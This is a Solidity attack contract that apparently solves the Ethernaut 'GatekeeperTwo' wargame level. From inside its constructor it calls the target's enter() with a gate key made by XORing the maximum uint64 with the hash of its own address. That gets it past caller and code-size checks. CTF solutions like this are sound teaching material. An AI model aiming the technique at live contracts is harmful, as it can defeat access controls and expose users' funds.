pragma solidity ^0.8.20;

import {console} from "forge-std/Script.sol";

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack {
    IGatekeeperTwo private externalContract;

    constructor(address _externalContract) {
        externalContract = IGatekeeperTwo(_externalContract);
        console.log(uint64(type(uint64).max));
        console.log(uint64(bytes8(keccak256(abi.encodePacked(this)))));
        bytes8 gateKey = bytes8(type(uint64).max) ^ bytes8(keccak256(abi.encodePacked(this)));
        (bool success,) = address(externalContract).call(abi.encodeWithSignature("enter(bytes8)", gateKey));
        require(success, "Call failed");
    }
}
